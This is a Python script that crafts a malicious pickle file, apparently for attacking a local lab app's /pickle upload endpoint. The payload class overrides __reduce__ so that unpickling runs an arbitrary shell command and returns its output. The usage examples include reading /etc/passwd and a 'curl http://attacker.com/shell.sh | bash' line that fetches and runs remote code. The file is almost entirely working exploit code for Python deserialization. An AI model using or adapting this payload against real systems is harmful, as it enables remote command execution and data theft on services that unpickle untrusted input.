"""
generate_pickle.py — craft a malicious pickle payload

Usage:
    python generate_pickle.py "whoami"
    python generate_pickle.py "systeminfo"
    python generate_pickle.py "cat /etc/passwd"
    python generate_pickle.py "curl http://attacker.com/shell.sh | bash"

Output: evil.pkl  (upload this to POST /pickle)
"""

import pickle
import subprocess
import functools
import sys


class RCEPayload:
    """
    When pickle.loads() deserializes this object, Python calls __reduce__()
    to reconstruct it. We hijack that to run an OS command and CAPTURE
    its output — returned as the deserialized value.

    os.system()               — executes, returns exit code only (output lost)
    subprocess.check_output() — executes, captures and returns stdout as bytes

    __reduce__ returns a 2-tuple: (callable, args) → callable(*args)
    We use functools.partial to bake shell=True into the callable so we
    can pass the command as a plain string without a 3-tuple (which pickle
    interprets as state for __setstate__, not kwargs).
    """
    def __init__(self, command: str):
        self.command = command

    def __reduce__(self):
        run = functools.partial(subprocess.check_output, shell=True)
        return (run, (self.command,))


if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "whoami"
    payload = pickle.dumps(RCEPayload(cmd))

    with open("evil.pkl", "wb") as f:
        f.write(payload)

    print(f"[+] Malicious pickle written to evil.pkl")
    print(f"[+] Command encoded: {cmd!r}")
    print(f"[+] Payload size: {len(payload)} bytes")
    print()
    print("Upload with:")
    print("  curl -F 'file=@evil.pkl' http://localhost:5000/pickle")